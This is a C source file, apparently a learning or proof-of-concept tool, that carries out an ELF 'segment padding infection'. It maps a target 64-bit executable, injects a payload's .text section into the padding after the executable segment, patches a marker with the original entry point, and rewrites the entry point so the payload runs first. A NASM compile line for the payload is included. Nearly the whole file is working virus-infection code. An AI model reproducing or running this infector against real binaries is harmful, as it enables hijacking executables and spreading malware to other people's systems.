
/* Segment padding infection */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <elf.h>
#include <sys/mman.h>

/* Helper functions */
static int get_file_size (int fd)
{
  struct stat _info;
  
  fstat (fd, &_info);

  return _info.st_size;
}

/* Open a file and map it in memory */
int open_and_map (char *filename, void **data, int *len)
{
  int   size;
  int   fd;
  if ((fd = open (filename, O_APPEND | O_RDWR, 0)) < 0) {
      perror ("open:");
      exit (1); }
  size = get_file_size (fd);
  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED) {
      perror ("mmap:");
      exit (1); }
  printf ("--Mapping %d bytes  at %p\n", size, data);
  *len = size;
  return fd;
}

Elf64_Phdr* find_a_gap (void *d, int filesize, int *end_of_text_sec, int *len)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg, *text_seg;
  int         numb_of_segm = elf_hdr->e_phnum;
  int         i;
  int         text_end, gap=filesize;
//e_phoff  holds the program header table's file offset in bytes.
  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr->e_phoff);

  for (i = 0; i < numb_of_segm; i++) {
      //011 - exec.
      if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011) {
          printf ("+ Have gotten a  .text segment (#%d)\n", i);
	  text_seg = elf_seg;
	  text_end = elf_seg->p_offset + elf_seg->p_filesz; }
      else {
          //p_offset - the first byte of the segment resides.
	  if (elf_seg->p_type == PT_LOAD && 
	      (elf_seg->p_offset - text_end) < gap) {
	      printf ("--Got a  LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg->p_offset);
	      gap = elf_seg->p_offset - text_end; }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr->e_phentsize);
    }
  *end_of_text_sec = text_end;
  *len = gap;
  printf ("-- A gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);
  return text_seg;
}


//access to the symbol table in the ELF file(everything that is a human readable string)
Elf64_Shdr * elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
    //e_shoff - offset of the section header table
    //headers ind
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
    //e_shstrndx is the index of the section header that contains the offset of the section header string table.
      Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab->sh_offset;

  for (i = 0; i < elf_hdr->e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &shdr[i];
    }
  
  return NULL;
}

int elfi_mem_subst (void *m, int len, uint32_t pat, uint32_t val)
{
    unsigned char *p = (unsigned char*)m;
    uint32_t v;
    int i, r;

    for (i = 0; i < len; i++)
    {
        v = *((uint32_t*)(p+i));
        r = v ^ pat;

        if (r == 0)
        {
            printf ("--Mark %lx found at offset %d -> %lx\n", pat, i, val);
            *((uint32_t*) (p+i)) = val;
            return 0;
        }
    }
    return -1;
}

int main (int argc, char *argv[])
{
  void        *offset_of_file, *offset_of_virus;
  int         target_fd, payload_fd;
  int         fileSize, virusSize;
  Elf64_Ehdr* elf_hdr;
  Elf64_Phdr  *infection_segment;
  Elf64_Shdr  *p_text_sec;
  Elf64_Addr  base, ep;
  int         end_of_text_sec, len;


  if (argc != 3)
    {
      fprintf (stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
      exit (1);
    }

  /* Open and map ELF we want to be infected */
  target_fd = open_and_map (argv[1], &offset_of_file, &fileSize);
  payload_fd = open_and_map (argv[2], &offset_of_virus, &virusSize);


  elf_hdr = (Elf64_Ehdr *) offset_of_file;
    /* Getting an entry point */
  ep = elf_hdr->e_entry;
  printf ("--Original entry point is %p\n", (void*) ep);


  /* Getting an executable segment */
    infection_segment = find_a_gap (offset_of_file, fileSize, &end_of_text_sec, &len);


  //This member gives the virtual address at which the first byte of the segment resides in memory.
  base = infection_segment->p_vaddr;

  /* Process payload */
  p_text_sec = elfi_find_section (offset_of_virus, ".text");

  if (p_text_sec->sh_size > len)
    {
      fprintf (stderr, "- Payload to big, cannot infect file.\n");
      exit (1);
    }
  /* Copy payload in the segment padding area.  */
    //sh_offset - first byte in the section
    //Destination, source, size
  memmove (offset_of_file + end_of_text_sec, offset_of_virus + p_text_sec->sh_offset, p_text_sec->sh_size);

  /* Changing an entry point */
  elfi_mem_subst (offset_of_file+end_of_text_sec, p_text_sec->sh_size, 0x11111111, ep);

  /* Patching an entry point */
  elf_hdr->e_entry = (Elf64_Addr) (base + end_of_text_sec);

  /* Close files and actually update target file */
  close (payload_fd);
  close (target_fd);

  return 0;
}


/*
To compile
nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
*/
